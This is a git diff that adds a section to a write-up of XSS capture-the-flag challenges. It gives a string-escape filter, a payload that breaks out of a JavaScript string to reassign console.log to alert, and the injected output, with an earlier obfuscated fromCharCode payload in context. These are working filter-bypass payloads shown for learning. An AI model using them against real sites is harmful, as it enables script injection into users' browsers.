@@ -11,6 +11,7 @@
 - [Skandia](#skandia)
 - [JSON2](#json2)
 - [Well](#well)
+- [No](#no)
 
 ## Warmup
 
@@ -163,4 +164,37 @@ function escape(s) {
 
 ```
 '+Function`a${`alert${Function`a${`return fromCharCode`}{fromCharCode}``${String}``40`}1${Function`a${`return fromCharCode`}{fromCharCode}``${String}``41`}`}```+'
+```
+
+
+## No
+
+- Task
+
+```
+// submitted by Stephen Leppik
+
+function escape(s) {
+    s = s.replace(/[()`<]/g, ''); // no function calls
+
+    return '<script>\n' +
+           'var string = "' + s + '";\n' +
+           'console.log(string);\n' +
+           '</script>';
+}
+```
+
+- Solution
+
+```
+";string=1;console.log=alert//
+```
+
+- Output
+
+```
+<script>
+var string = "";string=1;console.log=alert//";
+console.log(string);
+</script>
 ```
